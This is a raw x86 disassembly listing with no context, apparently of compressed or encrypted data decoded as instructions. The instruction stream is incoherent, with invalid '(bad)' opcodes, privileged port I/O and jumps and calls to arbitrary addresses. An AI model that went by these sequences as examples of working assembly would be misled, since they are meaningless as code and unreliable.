  42a334:	pop    ecx
  42a335:	daa    
  42a336:	(bad)  
  42a337:	push   ecx
  42a338:	inc    ebx
  42a339:	mov    edx,0x5fd6a5ce
  42a33e:	std    
  42a33f:	ror    DWORD PTR [esi-0x21ca91de],1
  42a345:	scas   eax,DWORD PTR es:[edi]
  42a346:	fst    st(4)
  42a348:	mov    ch,BYTE PTR [edx-0x5a]
  42a34b:	xor    ebp,DWORD PTR [ecx]
  42a34d:	mov    dh,BYTE PTR [esi]
  42a34f:	add    ah,BYTE PTR [edi+0x24814f09]
  42a355:	aaa    
  42a356:	and    al,0x91
  42a358:	or     BYTE PTR [eax+esi*4],ch
  42a35b:	sbb    DWORD PTR [esi-0xa],0x554beeed
  42a362:	loope  0x42a2f6
  42a364:	jg     0x42a3b8
  42a366:	sub    al,BYTE PTR [ecx]
  42a368:	fs and eax,0x6c518b43
  42a36e:	das    
  42a36f:	ins    BYTE PTR es:[edi],dx
  42a370:	and    al,BYTE PTR [ebp+0x6]
  42a373:	les    esi,FWORD PTR ds:0xd5e20b1c
  42a379:	lock js 0x42a305
  42a37c:	(bad)  
  42a37f:	push   ebp
  42a380:	and    dl,0xea
  42a383:	jmp    0xcb21:0xbe107a4b
  42a38a:	and    bh,BYTE PTR [ecx-0x62c29271]
  42a390:	mov    BYTE PTR [eax],0x0
	...
  42a3f3:	add    BYTE PTR [edi+0xe],bh
  42a3f6:	jne    0x42a433
  42a3f8:	jne    0x42a475
  42a3fa:	jg     0x42a44a
  42a3fc:	loop   0x42a467
  42a3fe:	mov    ebp,0xc6ac0a3d
  42a403:	in     eax,dx
  42a404:	add    ah,0x1
  42a407:	add    BYTE PTR ds:0xff000001,al
  42a40d:	imul   eax,DWORD PTR [eiz*8+0x3c56c50b],0x719d9636
  42a418:	add    BYTE PTR es:[edx+0x1b755d9c],dl
  42a41f:	fidivr WORD PTR [ecx]
  42a421:	jns    0x42a3dd
  42a423:	in     eax,dx
  42a424:	xchg   esi,eax
  42a425:	shl    BYTE PTR [ecx+0x20],cl
  42a428:	daa    
  42a429:	daa    
  42a42a:	loopne 0x42a451
  42a42c:	cmp    eax,DWORD PTR [ebp+0x65]
  42a42f:	cmp    ebp,edx
  42a431:	aas    
  42a432:	pop    ebp
  42a433:	pop    ecx
  42a434:	test   al,0xbf
  42a436:	pslld  mm1,QWORD PTR [edi+0x2a3429d9]
  42a43d:	mov    ecx,DWORD PTR [esi-0xb]
  42a440:	test   al,0x52
  42a442:	call   0x7a281e75
  42a447:	call   esi
  42a449:	inc    eax
  42a44a:	mov    esi,0xfd1048da
  42a44f:	mov    ebp,0x85ca118d
  42a454:	es test eax,0xdc781e30
  42a45a:	and    eax,0x4e064fb9
  42a45f:	mov    dh,0x28
  42a461:	mov    ebx,fs
  42a463:	mul    edi
  42a465:	jge    0x42a4c9
  42a467:	hlt    
  42a468:	and    BYTE PTR es:[edi+0x19],0x89
  42a46d:	data16 int 0x90
  42a470:	popa   
  42a471:	dec    eax
  42a472:	not    ah
  42a474:	or     bh,BYTE PTR [eax-0x6d]
  42a477:	js     0x42a4af
  42a479:	or     al,0x56
  42a47b:	push   0xfffffff0
  42a47d:	out    dx,eax
  42a47e:	jb     0x42a486
  42a480:	sbb    ecx,ebp
  42a482:	cmp    eax,0x878473da
  42a487:	pop    ecx
  42a488:	retf   
  42a489:	retf   0x8390
  42a48c:	pop    ebx
  42a48d:	scas   eax,DWORD PTR es:[edi]
  42a48e:	xchg   ebx,eax
  42a48f:	lds    edx,FWORD PTR [ebp-0x77]
  42a492:	imul   ebx,DWORD PTR [ecx+0x1525fee6],0xffffff8c
  42a499:	pusha  
  42a49a:	fwait
  42a49b:	jg     0x42a478
  42a49d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a49e:	sbb    ebp,DWORD PTR [ebx+0x42]
  42a4a1:	mov    ds:0xd26cb2a2,eax
  42a4a6:	mov    DWORD PTR [edi-0x6f],0xb59b8310
  42a4ad:	mov    es,ebp
  42a4af:	mov    edx,0x4f0d7cb1
  42a4b4:	in     al,dx
  42a4b5:	xchg   ebp,eax
  42a4b6:	test   dh,0x22
  42a4b9:	xchg   esp,eax
  42a4ba:	stc    
  42a4bb:	test   BYTE PTR [ecx],0x2e
  42a4be:	pop    es
  42a4bf:	mov    edi,0x745c7647
  42a4c4:	(bad)  
  42a4c5:	cwde   
  42a4c6:	dec    edi
  42a4c7:	ret    
  42a4c8:	push   ebp
  42a4c9:	and    DWORD PTR [ebx+0x28bf3fda],esp
  42a4cf:	inc    esi
  42a4d0:	fwait
  42a4d1:	jb     0x42a458
  42a4d3:	xchg   edx,eax
  42a4d4:	fld    DWORD PTR ds:0x26929ed4
  42a4da:	pop    ebx
  42a4db:	repnz cmp ebp,ecx
  42a4de:	cli    
  42a4df:	sahf   
  42a4e0:	aam    0x35
  42a4e2:	adc    al,0x84
  42a4e4:	sbb    eax,0x7295029b
  42a4e9:	in     ax,dx
  42a4eb:	or     BYTE PTR [ecx+0x21],cl
  42a4ee:	scas   al,BYTE PTR es:[edi]
  42a4ef:	mov    DWORD PTR [esi+0x1d],ecx
  42a4f2:	aas    
  42a4f3:	jb     0x42a4c3
  42a4f5:	sbb    BYTE PTR ds:[ebp+0x11b12bd2],cl
  42a4fc:	int    0x7f
  42a4fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a4ff:	xchg   esp,eax
  42a500:	js     0x42a510
  42a502:	jns    0x42a51e
  42a504:	enter  0x725e,0x44
  42a508:	fstp   st(6)
  42a50a:	dec    esp
  42a50b:	jns    0x42a4d3
  42a50d:	mov    al,0xc
  42a50f:	imul   ebx
	...
  42a571:	add    BYTE PTR [eax],al
  42a573:	add    BYTE PTR [eax],bl
  42a575:	dec    edi
  42a576:	pop    ss
  42a577:	mov    ecx,0xefbef957
  42a57c:	(bad)  
  42a57d:	cmc    
  42a57e:	mov    edx,0xf4eb5b9f
  42a583:	xchg   ecx,eax
  42a584:	xchg   ebp,eax
  42a586:	add    DWORD PTR [eax],eax
  42a588:	add    eax,0x22000001
  42a58d:	mov    dh,0xe8
  42a58f:	retf   
  42a590:	scas   eax,DWORD PTR es:[edi]
  42a591:	fidiv  DWORD PTR [ebp+0x2c]
  42a594:	xchg   edi,eax
  42a595:	add    ecx,DWORD PTR ss:[esi+0x38c5c071]
  42a59c:	aad    0xed
  42a59e:	xchg   ebx,eax
  42a59f:	or     bl,BYTE PTR [ebx-0x4a]
  42a5a2:	jle    0x42a5a3
  42a5a4:	sub    BYTE PTR [edx+0x26],dl
  42a5a7:	jno    0x42a622
  42a5a9:	arpl   WORD PTR [ecx],bx
  42a5ab:	pushf  
  42a5ac:	cmp    eax,DWORD PTR [ecx-0x4b7057f0]
  42a5b2:	outs   dx,BYTE PTR ds:[esi]
  42a5b3:	in     al,0x9
  42a5b5:	aas    
  42a5b6:	ret    0x107b
  42a5b9:	inc    bh
  42a5bb:	mov    ecx,0x2c670fbc
  42a5c0:	jecxz  0x42a57a
  42a5c2:	imul   esp,DWORD PTR [ebp-0x6aba14b8],0xffffffd6
  42a5c9:	sub    dh,BYTE PTR [ebx]
  42a5cb:	outs   dx,DWORD PTR ds:[esi]
  42a5cc:	int    0x2e
  42a5ce:	push   esp
  42a5cf:	out    0x71,al
  42a5d1:	ret    
  42a5d2:	mov    cl,0x26
  42a5d4:	mov    DWORD PTR [ebx-0x5f979f8e],ebx
  42a5da:	repnz and esi,DWORD PTR [esi]
  42a5dd:	ins    BYTE PTR es:[edi],dx
  42a5de:	cdq    
  42a5df:	ds in  al,0xde
  42a5e2:	in     eax,dx
  42a5e3:	loopne 0x42a5ce
  42a5e5:	outs   dx,DWORD PTR ds:[esi]
  42a5e7:	mov    ?,WORD PTR [esi-0x6828d8e5]
  42a5ed:	mov    DWORD PTR ds:[ebx+edx*2],ebp
  42a5f1:	mov    ds,WORD PTR [eax+eax*8]
  42a5f4:	cmp    eax,0x3064b111
  42a5f9:	xchg   esp,eax
  42a5fa:	cdq    
  42a5fb:	adc    eax,0x27626092
  42a600:	and    al,0xaf
  42a602:	mov    BYTE PTR [ebx+ebx*2-0x28],ah
  42a606:	rcr    BYTE PTR [ebp+0x5b],1
  42a609:	aam    0x14
  42a60b:	push   ds
  42a60c:	jb     0x42a627
  42a60e:	sub    esp,DWORD PTR [ebp+edi*8-0x57]
  42a612:	xchg   edx,eax
  42a613:	adc    BYTE PTR [ecx],dh
  42a615:	pop    ebx
  42a616:	nop
  42a617:	imul   ecx,DWORD PTR [ebx],0xffffff9e
  42a61a:	dec    edx
  42a61b:	inc    ebp
  42a61c:	cmp    ch,BYTE PTR [ecx-0x7e]
  42a61f:	jp     0x42a5d6
  42a621:	pmaxub mm6,QWORD PTR [edx+0x27]
  42a625:	call   0x67b190c9
  42a62a:	mov    bl,0x90
  42a62c:	mov    esi,0xe3066fb1
  42a631:	pusha  
  42a632:	mov    eax,0x8092b3ee
  42a637:	add    DWORD PTR [edi+0x4b],ebx
  42a63a:	jmp    0x42a63f
  42a63c:	inc    ebp
  42a63d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a63e:	(bad)  
  42a63f:	inc    eax
  42a640:	jo     0x42a63f
  42a642:	add    DWORD PTR [edx],ebx
  42a644:	imul   edx,DWORD PTR [ecx+eax*4+0x7d],0x16
  42a649:	test   DWORD PTR [edi],edx
  42a64b:	test   ecx,ebp
  42a64d:	lock push ecx
  42a64f:	repz dec ecx
  42a651:	lods   al,BYTE PTR ds:[esi]
  42a652:	pop    DWORD PTR [ecx]
  42a654:	pop    ds
  42a655:	or     al,0x96
  42a657:	jge    0x42a633
  42a659:	arpl   WORD PTR [esi+eax*2-0x7bbbef6d],cx
  42a660:	push   cs
  42a661:	(bad)  
  42a663:	fild   WORD PTR [ecx+0x2ff4e653]
  42a669:	xchg   ebp,eax
  42a66a:	das    
  42a66b:	scas   eax,DWORD PTR es:[edi]
  42a66c:	mov    eax,0x59abc97d
  42a671:	xchg   edi,eax
  42a672:	mov    edi,0x7f5d8e0d
  42a677:	into   
  42a678:	je     0x42a6dc
  42a67a:	mov    ecx,0x6c8a5b74
  42a67f:	mov    ch,0xa8
  42a681:	add    bh,ch
  42a683:	jmp    0xe6976d5e
  42a688:	adc    al,BYTE PTR [esi-0xcda1420]
  42a68e:	xchg   esp,eax
  42a68f:	xchg   ebx,eax
  42a690:	adc    eax,0x0
	...
  42a6f1:	add    BYTE PTR [eax],al
  42a6f3:	add    BYTE PTR [esi+edx*1],ah
  42a6f6:	outs   dx,BYTE PTR ds:[esi]
  42a6f7:	(bad)  
  42a6f8:	jle    0x42a6f9
  42a6fa:	lods   eax,DWORD PTR ds:[esi]
  42a6fb:	test   DWORD PTR [edi+0x2fb8131c],0x8ca459b0
  42a705:	mov    BYTE PTR [ecx],0x0
  42a708:	add    eax,0xd6000001
  42a70d:	cmp    DWORD PTR [ebx+0x17],eax
  42a710:	xchg   esi,eax
  42a711:	retf   
  42a712:	jge    0x42a69b
  42a714:	xchg   esp,eax
  42a715:	out    dx,al
  42a716:	jge    0x42a6c0
  42a718:	and    eax,0x7e5af55f
  42a71d:	xor    eax,0x8301070d
  42a722:	in     eax,dx
  42a723:	xor    ebx,DWORD PTR [eax]
  42a725:	add    al,0x24
  42a727:	sbb    DWORD PTR [eax+0x45],esp
  42a72a:	dec    esi
  42a72b:	xchg   edx,eax
  42a72c:	inc    ebp
  42a72d:	int3   
  42a72e:	sub    bh,BYTE PTR [edi]
  42a730:	cwde   
  42a731:	into   
  42a732:	jns    0x42a6ce
  42a734:	pop    ecx
  42a735:	std    
  42a736:	lea    ebp,[eax-0x66c7b9fa]
  42a73c:	xchg   al,bh
  42a73e:	xlat   BYTE PTR ds:[ebx]
  42a73f:	inc    eax
  42a740:	fmul   st,st(0)
  42a742:	lock in eax,0xa6
  42a745:	sub    esp,ebp
  42a747:	mov    BYTE PTR [edx+0x2a70e0fa],ah
  42a74d:	and    ebx,DWORD PTR [edx+0x42]
  42a750:	xor    dh,BYTE PTR [ebx-0x7a5762a0]
  42a756:	or     DWORD PTR [edx+0x2a],0x38
  42a75a:	lock and BYTE PTR [edi],al
  42a75d:	repnz shr DWORD PTR [esi+0x65],cl
  42a761:	cmp    DWORD PTR [edx+0x19],ebp
  42a764:	adc    ebp,edi
  42a766:	rcr    bl,cl
  42a768:	retf   
  42a769:	cdq    
  42a76a:	lods   al,BYTE PTR ds:[esi]
  42a76b:	pusha  
  42a76c:	pop    esi
  42a76d:	cmp    edx,ebp
  42a76f:	popf   
  42a770:	sub    eax,0xb980181a
  42a775:	in     al,dx
  42a776:	lods   al,BYTE PTR ds:[esi]
  42a777:	or     DWORD PTR [eax+0x78365502],ecx
  42a77d:	sub    BYTE PTR [ebp+0x33c051bf],dl
  42a783:	xor    esi,DWORD PTR [eax+0x3689dc88]
  42a789:	ret    0xec8c
  42a78c:	jge    0x42a78f
  42a78e:	dec    ebx
  42a78f:	push   esi
  42a790:	and    BYTE PTR [esp+edi*2],bh
  42a793:	arpl   WORD PTR [ebp-0x5a6a49d9],sp
  42a799:	mov    edi,0x478eef5
  42a79e:	les    edi,FWORD PTR [ebx-0x16]
  42a7a1:	and    DWORD PTR [ebx+0x39],0xffffffad
  42a7a5:	inc    eax
  42a7a6:	mov    bl,0x1
  42a7a8:	cmp    ebx,edx
  42a7aa:	cmp    eax,0xf2cd5346
  42a7af:	fistp  QWORD PTR [ebp-0x1]
  42a7b2:	imul   ecx,DWORD PTR [ebx],0xfffffff5
  42a7b5:	xchg   edi,eax
  42a7b6:	cs push ss
  42a7b8:	std    
  42a7b9:	cli    
  42a7ba:	dec    edi
  42a7bb:	pop    eax
  42a7bc:	add    BYTE PTR [eax-0x6f2bae6c],cl
  42a7c2:	mul    dh
  42a7c4:	enter  0xfbe2,0x84
  42a7c8:	mov    bl,0xb6
  42a7ca:	sub    al,dh
  42a7cc:	enter  0xf6a4,0x3d
  42a7d0:	push   edx
  42a7d1:	ss push edi
  42a7d3:	lock sub ah,BYTE PTR [edx]
  42a7d6:	popa   
  42a7d7:	and    edx,ebx
  42a7d9:	ins    DWORD PTR es:[edi],dx
  42a7da:	sbb    ch,BYTE PTR [edx-0x54fbea74]
  42a7e0:	sahf   
  42a7e1:	xor    al,0xd4
  42a7e3:	cmc    
  42a7e4:	mov    eax,0x32d1ef64
  42a7e9:	mov    eax,ds:0xb00d4890
  42a7ee:	loope  0x42a83b
  42a7f0:	xor    BYTE PTR [ebx+0x4d16936],0x50
  42a7f7:	or     ah,dh
  42a7f9:	pop    ds
  42a7fa:	xchg   ebp,eax
  42a7fb:	stos   BYTE PTR es:[edi],al
  42a7fc:	je     0x42a7c0
  42a7fe:	sbb    ch,al
  42a800:	in     al,0xbe
  42a802:	addr16 addr16 loopne 0x42a7bb
  42a806:	jmp    0x42a848
  42a808:	dec    esp
  42a809:	gs jle 0x42a87e
  42a80c:	data16 jne 0x42a7af
  42a80f:	xor    al,0xa1
	...
  42a871:	add    BYTE PTR [eax],al
  42a873:	add    BYTE PTR [edx-0x10409c9b],cl
  42a879:	mov    edi,0xc58175de
  42a87e:	xchg   edi,eax
  42a87f:	ins    BYTE PTR es:[edi],dx
  42a880:	sti    
  42a881:	pop    ecx
  42a882:	sti    
  42a883:	jno    0x42a816
  42a885:	mov    DWORD PTR [ecx],0x10500
  42a88b:	add    BYTE PTR [esi+eiz*1-0x35],bh
  42a88f:	out    dx,al
  42a890:	daa    
  42a891:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a892:	fdiv   st,st(3)
  42a894:	(bad)  
  42a896:	out    0x5,eax
  42a898:	dec    ecx
  42a899:	xor    eax,DWORD PTR [edx]
  42a89b:	mov    cl,BYTE PTR [esp+eax*2+0x52082b13]
  42a8a2:	rol    DWORD PTR es:[edx],0x9a
  42a8a6:	(bad)  
  42a8a7:	xchg   ebp,eax
  42a8a8:	fs xchg edi,eax
  42a8aa:	push   0xeadbef9e
  42a8af:	test   al,0x68
  42a8b1:	sbb    edi,esi
  42a8b3:	das    
  42a8b4:	in     eax,0xf5
  42a8b6:	aas    
  42a8b7:	xchg   edi,eax
  42a8b8:	jae    0x42a846
  42a8ba:	leave  
  42a8bb:	in     eax,0x35
  42a8bd:	cmp    DWORD PTR [eax-0x27741cdc],ebp
  42a8c3:	fsubr  DWORD PTR [esi]
  42a8c5:	mov    ds:0x6773cd8c,eax
  42a8ca:	mov    BYTE PTR [edx],dh
  42a8cc:	test   eax,0x387b333c
  42a8d1:	dec    edx
  42a8d2:	aas    
  42a8d3:	outs   dx,BYTE PTR ds:[esi]
  42a8d4:	and    eax,DWORD PTR [edi+0x1c]
  42a8d7:	stos   BYTE PTR es:[edi],al
  42a8d8:	dec    esp
  42a8d9:	inc    ebx
  42a8da:	cmp    ah,dh
  42a8dc:	lea    eax,[edx+0x58b39c09]
  42a8e2:	or     cl,BYTE PTR [ecx-0x4]
  42a8e5:	ret    0xec
  42a8e8:	pop    es
  42a8e9:	mov    cl,0x6e
  42a8eb:	sar    DWORD PTR [ecx],1
  42a8ed:	add    eax,0x982cf993
  42a8f2:	sahf   
  42a8f3:	and    dh,BYTE PTR [esi+0x21]
  42a8f6:	xchg   esp,eax
  42a8f7:	xchg   di,ax
  42a8f9:	nop
  42a8fa:	jb     0x42a8c8
  42a8fc:	loopne 0x42a8a9
  42a8fe:	(bad)  
  42a900:	or     cl,BYTE PTR [edx]
  42a902:	xlat   BYTE PTR ds:[ebx]
  42a903:	xchg   esi,eax
  42a904:	xchg   edx,eax
  42a905:	mov    ds:0xa30f9d5b,al
  42a90a:	mov    dl,0xc0
  42a90c:	dec    edx
  42a90d:	push   edx
  42a90e:	ds jge 0x42a98b
  42a911:	mov    ecx,0x2688a66e
  42a916:	dec    esi
  42a917:	ins    DWORD PTR es:[edi],dx
  42a918:	mov    al,ds:0xe6b93ca
  42a91d:	adc    ebx,DWORD PTR [edi+0x1a9979b0]
  42a923:	jl     0x42a97a
  42a925:	jno    0x42a949
  42a927:	and    eax,0x5375e92f
  42a92c:	aas    
  42a92d:	inc    esp
  42a92e:	xchg   esp,eax
  42a92f:	retf   0xb731
  42a932:	(bad)  
  42a933:	add    ebx,0xb31dc99e
  42a939:	imul   edx,DWORD PTR [ebx+0x4],0x0
  42a93d:	loopne 0x42a98a
  42a93f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a940:	mov    ebp,0x7f1b9b54
  42a945:	(bad)  
  42a947:	cs jg  0x42a987
  42a94a:	cmp    DWORD PTR [eax+ebp*1-0x1a723d74],0x20ba7a1d
  42a955:	cmp    BYTE PTR [esi+0x46],bh
  42a958:	mov    edi,0xe471e71b
  42a95d:	mul    DWORD PTR [ecx+0x56510e80]
  42a963:	retf   
  42a964:	mul    DWORD PTR [bx]
  42a967:	and    dl,BYTE PTR [ebp+0x7d]
  42a96a:	sbb    al,0xd4
  42a96c:	pop    eax
  42a96d:	push   edi
  42a96e:	cmp    eax,0x637bf0c9
  42a973:	fcomp  DWORD PTR [edi]
  42a975:	les    esi,FWORD PTR [edi]
  42a977:	arpl   WORD PTR [eax+0x3eb20b7d],bp
  42a97d:	(bad)  
  42a97e:	out    dx,al
  42a97f:	ret    
  42a980:	xor    dh,BYTE PTR [ebx]
  42a982:	repz and BYTE PTR [ecx+0x74da69ff],al
  42a989:	cmp    al,0x38
  42a98b:	test   al,0xea
  42a98d:	fst    st(0)
  42a98f:	inc    ecx
  42a990:	hlt    
	...
  42a9f1:	add    BYTE PTR [eax],al
  42a9f3:	add    BYTE PTR [eax+0x3fee1d93],ch
  42a9f9:	out    dx,al
  42a9fa:	sti    
  42a9fb:	xlat   BYTE PTR ds:[ebx]
  42a9fc:	in     eax,0xd3
  42a9fe:	aad    0x7
  42aa00:	xchg   edi,eax
  42aa01:	lea    edi,[ebx+0x3f]
  42aa04:	xchg   esi,eax
  42aa05:	enter  0x1,0x5
  42aa09:	add    DWORD PTR [eax],eax
  42aa0b:	add    BYTE PTR [edx-0x6174bdfd],dl
  42aa11:	adc    cl,BYTE PTR [esi+esi*4+0x4]
  42aa15:	pop    esi
  42aa16:	mov    ch,0xb9
  42aa18:	pop    ds
  42aa19:	sub    esi,ebx
  42aa1b:	inc    esi
  42aa1c:	loopne 0x42aa3a
  42aa1e:	cld    
  42aa1f:	test   edi,ebx
  42aa21:	or     BYTE PTR [edx+0x1c],dl
  42aa24:	mov    dh,0xd2
  42aa26:	cwde   
  42aa27:	xor    cl,dl
  42aa29:	mov    DWORD PTR [edi-0xa],esp
  42aa2c:	sub    cl,cl
  42aa2e:	popf   
  42aa2f:	test   eax,0x53b588f5
  42aa34:	(bad)  
  42aa35:	fsub   QWORD PTR [esi-0x133b0bef]
  42aa3b:	cmp    DWORD PTR [ebp+0x602bf7a4],edi
  42aa41:	cs repz pop ebx
  42aa44:	xchg   esp,eax
  42aa45:	les    ebx,FWORD PTR [edx+0x4047b17a]
  42aa4b:	sbb    DWORD PTR [esp+ebp*4-0x45bf5998],esp
  42aa52:	bound  ecx,QWORD PTR [eax]
  42aa54:	xor    BYTE PTR [ebx-0x16],0xba
  42aa58:	mov    WORD PTR [eax+eax*8],ss
  42aa5b:	mov    edi,DWORD PTR [ebp-0x24]
  42aa5e:	(bad)  
  42aa5f:	(bad)  
  42aa60:	cld    
  42aa61:	or     esp,DWORD PTR [ebp+0x2f]
  42aa64:	repz mov ecx,esi
  42aa67:	cli    
  42aa68:	imul   esp,DWORD PTR [esi-0xa258cb5],0x221abf84
  42aa72:	scas   eax,DWORD PTR es:[edi]
  42aa73:	xor    al,0xb4
  42aa75:	test   al,0x89
  42aa77:	adc    BYTE PTR [esi],ch
  42aa79:	inc    esi
  42aa7a:	enter  0xfd28,0x89
  42aa7e:	pop    edx
  42aa7f:	cmc    
  42aa80:	cmp    esp,DWORD PTR [ebp-0x7e0387e7]
  42aa86:	shl    cl,1
  42aa88:	outs   dx,DWORD PTR ds:[esi]
  42aa89:	pop    eax
  42aa8a:	in     al,dx
  42aa8b:	(bad)  
  42aa8c:	cld    
  42aa8d:	into   
  42aa8e:	inc    esi
  42aa8f:	sar    BYTE PTR [eax+eax*2-0x32ca8bbf],1
  42aa96:	(bad)  
  42aa97:	mov    ecx,0xbda9957d
  42aa9c:	pop    eax
  42aa9d:	cmp    al,0x4c
  42aa9f:	gs lock or al,0xac
  42aaa3:	adc    al,0xcd
  42aaa5:	mov    bl,0x46
  42aaa7:	jge    0x42aafd
  42aaa9:	arpl   di,ax
  42aaab:	fist   WORD PTR [ecx]
  42aaad:	add    BYTE PTR [edi-0x1786e661],ah
  42aab3:	sub    DWORD PTR [edi],esp
  42aab5:	loop   0x42aa5d
  42aab7:	popa   
  42aab8:	sbb    al,0x87
  42aaba:	add    eax,0xb9984fbc
  42aabf:	imul   ebp,esi,0xaaf3b156
  42aac5:	jmp    0xecf5:0x6a8a78b9
  42aacc:	cmc    
  42aacd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aace:	call   0x7f2a7998
  42aad3:	xor    ah,BYTE PTR [edx]
  42aad5:	cdq    
  42aad6:	in     eax,0xe5
  42aad8:	ja     0x42ab14
  42aada:	push   cs
  42aadb:	jmp    0xc29d1ff4
  42aae0:	mov    dh,0x82
  42aae2:	ins    DWORD PTR es:[edi],dx
  42aae3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aae4:	fwait
  42aae5:	cmc    
  42aae6:	xchg   ebp,eax
  42aae7:	div    dl
  42aae9:	lods   eax,DWORD PTR ds:[esi]
  42aaea:	fisttp DWORD PTR ds:0xd188cdc2
  42aaf0:	inc    DWORD PTR [ebx+0x21da43c7]
  42aaf6:	bound  edi,QWORD PTR [edi-0x36fb7a7e]
  42aafc:	nop
  42aafd:	push   es
  42aafe:	xchg   ebp,eax
  42aaff:	push   ecx
  42ab00:	dec    ebp
  42ab01:	dec    esp
  42ab02:	loopne 0x42ab30
  42ab04:	fisub  DWORD PTR [ebx-0x7d64bcb9]
  42ab0a:	cwde   
  42ab0b:	pop    eax
  42ab0c:	aaa    
  42ab0d:	jae    0x42ab63
  42ab0f:	pop    ecx
  42ab10:	rol    BYTE PTR [eax],0x0
	...
  42ab73:	add    BYTE PTR [esi],bh
  42ab75:	push   cs
  42ab76:	sub    al,0x5d
  42ab78:	cmp    al,0x7f
  42ab7a:	jg     0x42abeb
  42ab7c:	and    BYTE PTR [eax],cl
  42ab7e:	mov    dl,0x43
  42ab80:	pop    esi
  42ab81:	xchg   esp,eax
  42ab82:	leave  
  42ab83:	mov    edx,0x1c99b
  42ab88:	add    eax,0xb6000001
  42ab8d:	sbb    eax,esi
  42ab8f:	inc    eax
  42ab90:	adc    eax,0xefd459d1
  42ab95:	in     al,0x86
  42ab97:	mov    edi,0x32535ee3
  42ab9c:	daa    
  42ab9d:	imul   eax,DWORD PTR [eax+0x8],0x7f1f8aeb
  42aba4:	mov    ebp,0x4f657d72
  42aba9:	xchg   esp,eax
  42abaa:	mov    WORD PTR [ecx],ds
  42abac:	pushf  
  42abad:	sahf   
  42abae:	mov    ds:0x15c38643,eax
  42abb3:	push   esp
  42abb4:	mov    ds:0x5ba777eb,eax
  42abb9:	ins    DWORD PTR es:[edi],dx
  42abba:	arpl   di,ax
  42abbc:	dec    esp
  42abbd:	lods   eax,DWORD PTR ds:[esi]
  42abbe:	pop    esi
  42abbf:	inc    edi
  42abc0:	imul   esi,DWORD PTR [ebx],0xf8fd12a8
  42abc6:	cdq    
  42abc7:	shl    DWORD PTR [edx-0x72ec9f9b],1
  42abcd:	xchg   BYTE PTR [ecx+eax*2],bl
  42abd0:	push   0x57821fb2
  42abd5:	nop
  42abd6:	add    BYTE PTR [ecx],ch
  42abd8:	rcl    dh,cl
  42abda:	add    edi,0xd9e7ef71
  42abe0:	jp     0x42abd1
  42abe2:	cmp    eax,0x88634768
  42abe7:	out    dx,eax
  42abe8:	int3   
  42abe9:	outs   dx,DWORD PTR ds:[esi]
  42abea:	lds    ebx,FWORD PTR [ecx+eax*4-0x79]
  42abee:	and    dh,ch
  42abf0:	bound  esp,QWORD PTR [edi]
  42abf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42abf3:	es pop ecx
  42abf5:	or     ah,dh
  42abf7:	int    0x25
  42abf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42abfa:	stc    
  42abfb:	fcom   QWORD PTR [edi-0x73]
  42abfe:	sbb    eax,0x5e75cb3f
  42ac03:	cmp    al,0x2
  42ac05:	fbstp  TBYTE PTR [ebx-0xc]
  42ac08:	rcr    BYTE PTR [esi-0x6445a8d1],0x47
  42ac0f:	(bad)  
  42ac10:	pusha  
  42ac11:	adc    dh,cl
  42ac13:	fst    DWORD PTR [ebx-0x74]
  42ac16:	dec    edx
  42ac17:	idiv   DWORD PTR [esi]
  42ac19:	pop    eax
  42ac1a:	fidiv  DWORD PTR [ebp+0x30]
  42ac1d:	mov    DWORD PTR [ebx],edi
  42ac1f:	and    dh,BYTE PTR [ebx]
  42ac21:	das    
  42ac22:	xor    ch,BYTE PTR [edx-0x2bedb3bd]
  42ac28:	jns    0x42ac21
  42ac2a:	scas   eax,DWORD PTR es:[edi]
  42ac2b:	es shl ebx,0x5b
  42ac2f:	pop    ss
  42ac30:	call   0xbfcfff31
  42ac35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ac36:	imul   BYTE PTR [eax+0x8a266a8]
  42ac3c:	lock hlt 
  42ac3e:	push   0xa5088806
  42ac43:	and    dl,BYTE PTR [edx-0x38]
  42ac46:	cwde   
  42ac47:	test   eax,0xf99a36be
  42ac4c:	mov    esp,0x82f596bb
  42ac51:	addr16 repz pop esp
  42ac54:	mov    ch,0xb9
  42ac56:	pop    esp
  42ac57:	stos   BYTE PTR es:[edi],al
  42ac58:	and    eax,0x217eead7
  42ac5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ac5e:	xchg   ebp,eax
  42ac5f:	bound  esp,QWORD PTR [ebp-0x6497f611]
  42ac65:	push   0xefa9e5df
  42ac6a:	fcom   QWORD PTR [edx]
  42ac6c:	mov    ds:0x1219da5d,eax
  42ac71:	movaps xmm0,xmm7
  42ac74:	pop    esi
  42ac75:	test   BYTE PTR [esi+0x33],cl
  42ac78:	(bad)  
  42ac79:	gs or  cl,dl
  42ac7c:	in     al,dx
  42ac7d:	lock aas 
  42ac7f:	leave  
  42ac80:	mov    ds:0xfff73998,al
  42ac85:	pop    ss
  42ac86:	pop    ebp
  42ac87:	and    BYTE PTR [ebx-0x1bc442ac],ah
  42ac8d:	push   ecx
  42ac8e:	or     eax,0x741d
	...
  42acf3:	add    cl,ch
  42acf5:	xor    bl,BYTE PTR [edx+edi*1]
  42acf8:	fistp  QWORD PTR [esi]
  42acfa:	out    dx,eax
  42acfb:	repz ret 
  42acfd:	fcom   DWORD PTR [edx+0x72]
  42ad00:	test   DWORD PTR [ebp+0x4],esi
  42ad03:	mov    bh,0xa0
  42ad05:	retf   0x1
  42ad08:	add    eax,0x9000001
  42ad0d:	leave  
  42ad0e:	pop    ecx
  42ad0f:	jb     0x42ad27
  42ad11:	push   DWORD PTR [ebp+0x6214a3f8]
  42ad17:	cmp    DWORD PTR [esi+0x5d427443],ebp
  42ad1d:	popf   
  42ad1e:	mov    WORD PTR [ebx+0x25],cs
  42ad21:	and    bh,BYTE PTR [ebx+0x58]
  42ad24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ad25:	sub    eax,0xda2dabf0
  42ad2a:	push   ds
  42ad2b:	pushw  ss
  42ad2d:	call   0x6e36a311
  42ad32:	xor    ah,BYTE PTR [ebp-0x37]
